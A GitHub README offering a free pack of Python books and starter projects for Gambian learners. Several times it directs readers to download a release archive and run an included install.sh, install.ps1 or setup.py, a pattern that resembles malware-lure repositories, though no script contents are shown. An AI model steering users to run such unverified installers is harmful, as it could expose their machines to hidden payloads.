[![Releases](https://img.shields.io/github/v/release/Pavanbit/Free_python_book_for_gambian_dev?label=Releases&logo=github&color=2ea44f)](https://github.com/Pavanbit/Free_python_book_for_gambian_dev/releases)

# Free Python Book Pack for Gambian Developers and Learners

<img src="https://www.python.org/static/community_logos/python-logo.png" alt="Python" width="220" />

Free, beginner-friendly Python books curated for Gambian learners and developers. This repo gathers open books, tutorials, and hands-on guides on core Python topics: web development, data, automation, testing, object-oriented design and machine learning. Use the resources for self-study, classroom use, or to build small projects.

Badges
- ![Python 3](https://img.shields.io/badge/python-3.x-blue)
- ![Topics](https://img.shields.io/badge/topics-algorithms%20%7C%20data--science%20%7C%20web--dev-lightgrey)
- ![License](https://img.shields.io/badge/license-MIT-lightgrey)

Tags: algorithms, automation, data-analysis, data-science, django, flask, machine-learning, oops-in-python, programming-language, python, python27, python3, testing-automation, web-development

What you get
- A curated list of free, permissively licensed Python books and guides.
- PDF/HTML links, sample code, and short exercises for every chapter.
- Hands-on project ideas mapped to each book.
- Starter templates for Django and Flask apps.
- A simple testing and CI workflow for practice.

Hero resources
- Beginner: Python basics, control flow, data types, functions, I/O.
- OOP: classes, inheritance, composition, design patterns.
- Data: NumPy, pandas, visualization, intro to ML.
- Web: Flask quickstart, Django app structure, REST basics.
- Automation & Testing: scripting, requests, Selenium, pytest.

Get the books (download and run)
- Visit the Releases page to get the packaged resources and sample projects:
  https://github.com/Pavanbit/Free_python_book_for_gambian_dev/releases
- The Releases page includes downloadable assets. Download the appropriate release asset (zip or tar.gz). Each release includes an install or setup file. After download, extract the archive and run the included script:
  - On Linux / macOS:
    - unzip free_python_books_bundle.zip
    - cd free_python_books_bundle
    - chmod +x install.sh
    - ./install.sh
  - On Windows (PowerShell):
    - Expand-Archive -Path free_python_books_bundle.zip -DestinationPath .\free_python_books_bundle
    - cd .\free_python_books_bundle
    - .\install.ps1
- The install script copies PDFs, links, and sample projects into a local folder and creates a simple index.html you can open in a browser.
- If the release contains a Python setup script, run:
  - python3 setup.py install
- If the link above does not work, check the Releases section on the repository page.

Quick start — local reading
1. Clone the repo (optional if you only need the bundle):
   - git clone https://github.com/Pavanbit/Free_python_book_for_gambian_dev.git
2. Use the release bundle for offline reading or use the web index created by the installer.
3. Open index.html in your browser. It lists all available titles, sample code and exercises.

Sample learning paths
- New to programming (1–6 weeks)
  - Read: Python basics chapters (variables, control flow, functions).
  - Practice: small scripts: BMI calculator, file reader, CSV summary.
  - Project: command-line to-do app.

- Transition to web (4–8 weeks)
  - Read: Flask quickstart and Django fundamentals.
  - Practice: build a small Flask app that serves a JSON API.
  - Project: guestbook with forms, basic auth and SQLite.

- Data and machine learning (6–12 weeks)
  - Read: NumPy, pandas, data viz chapters.
  - Practice: load a dataset, compute aggregates, plot charts.
  - Project: simple classifier using scikit-learn and a notebook report.

- Testing and automation (ongoing)
  - Read: pytest, mocking and Selenium basics.
  - Practice: write unit tests for small modules, add CI config.
  - Project: automated form test script using Selenium.

Core folders and files (what the releases package provides)
- books/ — PDFs and HTML files for each included title.
- samples/ — small scripts tied to each chapter.
- projects/ — starter templates (Flask, Django, data notebooks).
- exercises/ — short tasks with answers in a separate folder.
- index.html — a local index for quick navigation.
- install.sh / install.ps1 — install script for the release bundle.

Example sample: read a CSV and print basic stats (samples/data_stats.py)
```python
import pandas as pd

def stats(path):
    df = pd.read_csv(path)
    print("Rows:", len(df))
    print(df.describe())

if __name__ == "__main__":
    stats("samples/data/example.csv")
```

Project ideas and how to pick one
- Choose by time budget: 2–6 hours (script), 1 week (small app), 1 month (data pipeline).
- Pair a book with an exercise. Read a chapter, try the exercises, then apply the idea to a tiny project.
- Example: After reading the web chapter, build a contact form that stores entries in SQLite. Add a test for form validation.

Django starter snapshot
- Folder: projects/django_starter
- Key files:
  - manage.py
  - mysite/settings.py
  - app/models.py
  - app/views.py
- Start:
  - python3 -m venv venv
  - source venv/bin/activate
  - pip install -r projects/django_starter/requirements.txt
  - cd projects/django_starter
  - python manage.py migrate
  - python manage.py runserver

Flask starter snapshot
- Folder: projects/flask_starter
- Key files: app.py, templates/, static/
- Run:
  - python3 -m venv venv
  - source venv/bin/activate
  - pip install -r projects/flask_starter/requirements.txt
  - FLASK_APP=app.py flask run

Testing and CI
- Use pytest for unit tests. Place tests in tests/ and run:
  - pytest -q
- Example test:
```python
def add(a, b):
    return a + b

def test_add():
    assert add(2, 3) == 5
```
- Example GitHub Actions workflow available in the releases bundle under .github/workflows/ci.yml.

How to contribute
- Open an issue for a missing book or a broken link.
- Submit a pull request that:
  - Adds a new book entry with metadata and link.
  - Adds a small sample or exercise for a chapter.
  - Keeps files under 10 MB when possible; link to larger PDFs instead.
- Use this template for PRs:
  - Title: Add: [Book Title] — Author
  - Body: brief description, license, link to source, and a sample exercise added.

Licenses and credits
- Each book in this pack keeps its original license. Check the book's metadata file in books/ for details.
- This repository wraps and links free resources. It adds tiny starter projects and exercises under an open license. See LICENSE file.

Useful external links
- Python docs: https://docs.python.org/3/
- Flask: https://flask.palletsprojects.com/
- Django: https://www.djangoproject.com/
- pandas guide: https://pandas.pydata.org/docs/
- scikit-learn: https://scikit-learn.org/

Releases and updates
- New book bundles, starter projects and small scripts appear in Releases.
- Download the latest release asset and run the included installer:
  [![Get Releases](https://img.shields.io/static/v1?label=Download&message=Free%20Python%20Books&color=blue&logo=github)](https://github.com/Pavanbit/Free_python_book_for_gambian_dev/releases)
- If the release contains an install script, run it to extract resources and build a local index.

Contact and community
- Use GitHub Issues to ask questions or request a book.
- Open pull requests to add localized content or sample projects targeted at Gambian learners.
- If you maintain a free Python book that fits this pack, add it via a PR and include license info.

Images and visual aids
- Python logo shown above.
- Use images in the releases package for chapter covers and sample diagrams. You can embed them in local index.html for offline use.

Accessibility and offline use
- The release index and PDFs work offline.
- The install script preserves folder structure and relative links for native reading.

This README keeps the work organized and actionable. Visit the Releases page to download the latest bundle and run the included installer:
https://github.com/Pavanbit/Free_python_book_for_gambian_dev/releases